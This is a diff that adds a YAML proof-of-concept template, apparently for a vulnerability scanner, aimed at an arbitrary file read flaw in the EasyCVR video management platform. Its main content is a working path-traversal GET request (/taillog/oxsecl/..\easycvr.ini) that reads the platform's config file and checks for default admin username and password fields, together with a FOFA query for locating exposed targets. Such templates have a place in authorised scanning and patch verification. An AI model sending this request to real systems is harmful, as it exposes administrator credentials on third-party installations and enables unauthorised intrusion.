@@ -1,0 +1,15 @@
+id: poc-yaml-easy-cvr-taillog-anyfile-read
+info:
+  name: EasyCVR视频管理平台 taillog 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: EasyCVR
+  fofa: body="EasyCVR"
+requests:
+- method: GET
+  path: /taillog/oxsecl/..\easycvr.ini
+  expression: status_code == 200 && contains(body,"default_admin_user=") && contains(body,"default_admin_password=")
+    && !contains(body,"<") && contains(content_type,"text/plain")
+variables: {}
+transport: http
